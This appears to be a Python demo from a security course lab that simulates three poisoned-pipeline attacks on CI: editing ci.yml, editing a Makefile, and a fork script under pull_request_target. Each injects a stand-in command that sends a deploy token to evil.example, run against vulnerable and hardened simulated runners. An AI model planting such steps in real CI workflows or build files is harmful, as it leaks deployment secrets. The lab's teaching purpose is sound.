"""Run three poisoned-pipeline attacks against a vulnerable and a secure CI setup (simulated).

    python caisp-course/ch4-ai-attacks-and-defenses-devops/labs/poisoned-pipeline/demo.py
"""

from __future__ import annotations

from pathlib import Path

from aisec_lab import make_canary

import ci_sim as ci

W = Path(__file__).resolve().parent / "workflows"
read = lambda n: (W / n).read_text(encoding="utf-8")  # noqa: E731
CANARY = make_canary("DEPLOYTOKEN")
CI_PATH = ".github/workflows/ci.yml"
EVIL = "exfil DEPLOY_TOKEN evil.example"

attacks = [
    ("1 direct PPE (edit ci.yml)", CI_PATH, "pull_request",
     ci.PullRequest({CI_PATH: read("vulnerable-ci.yml").replace("      - run: make test", f"      - run: {EVIL}")}),
     "vulnerable-ci.yml", "secure-ci.yml"),
    ("2 indirect PPE (edit Makefile)", CI_PATH, "pull_request",
     ci.PullRequest({"Makefile": f"test:\n\t{EVIL}"}), "vulnerable-ci.yml", "secure-ci.yml"),
    ("3 pull_request_target + fork script", ".github/workflows/pr.yml", "pull_request_target",
     ci.PullRequest({"scripts/test.sh": EVIL}, from_fork=True), "vulnerable-pr-target.yml", "secure-pr-target.yml"),
]

vuln = ci.Runner({"DEPLOY_TOKEN": CANARY})
secure = ci.Runner({}, {"DEPLOY_TOKEN": CANARY},
                   ci.Settings(require_fork_approval=True, protected_paths=ci.PROTECTED_PATHS,
                               environment_secrets_only_on_push=True))
print(f"{'Attack':<40}{'Vulnerable CI':<22}Secure CI")
for name, path, event, pr, vuln_wf, secure_wf in attacks:
    a = vuln.run(path, read(vuln_wf), pr, event)
    b = secure.run(path, read(secure_wf), pr, event)
    print(f"{name:<40}{'SECRET STOLEN' if a.leaked(CANARY) else 'safe':<22}"
          f"{'safe' if not b.leaked(CANARY) else 'SECRET STOLEN'}  ({b.blocked or 'ran without secrets'})")

print("\nLinter on vulnerable-pr-target.yml:")
for f in ci.lint_ppe(read("vulnerable-pr-target.yml")):
    print("  ", f)
